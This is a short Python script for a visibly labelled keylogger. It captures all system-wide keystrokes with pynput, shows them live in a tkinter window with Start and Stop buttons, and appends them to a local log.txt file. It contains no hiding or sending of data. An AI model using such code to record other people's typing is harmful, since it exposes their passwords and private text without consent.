import tkinter as tk
from pynput import keyboard
import threading

class Keylogger:
    def __init__(self, text_widget):
        self.text_widget = text_widget
        self.keys = []
        self.listener = None
        self.logging = False

    def on_press(self, key):
        if self.logging:
            try:
                k = key.char
            except AttributeError:
                k = str(key)
            self.keys.append(k)
            self.update_gui(k)
            self.write_file()

    def write_file(self):
        with open("log.txt", "a") as f:
            for key in self.keys:
                f.write(str(key))
            self.keys = []

    def update_gui(self, key):
        self.text_widget.insert(tk.END, key + " ")
        self.text_widget.see(tk.END)

    def start(self):
        if not self.listener or not self.listener.running:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
        self.logging = True

    def stop(self):
        self.logging = False
        if self.listener:
            self.listener.stop()

def start_logging():
    keylogger.start()
    status_label.config(text="Status: Logging...", fg="green")

def stop_logging():
    keylogger.stop()
    status_label.config(text="Status: Stopped", fg="red")

# Tkinter GUI
root = tk.Tk()
root.title("Simple Keylogger with Live View")
root.geometry("500x400")

frame = tk.Frame(root)
frame.pack(pady=10)

start_button = tk.Button(frame, text="Start Logging", command=start_logging, width=20, bg="green", fg="white")
start_button.grid(row=0, column=0, padx=10)

stop_button = tk.Button(frame, text="Stop Logging", command=stop_logging, width=20, bg="red", fg="white")
stop_button.grid(row=0, column=1, padx=10)

status_label = tk.Label(root, text="Status: Stopped", fg="red")
status_label.pack(pady=10)

text_area = tk.Text(root, height=15, width=60)
text_area.pack(pady=10)

keylogger = Keylogger(text_area)

root.mainloop()
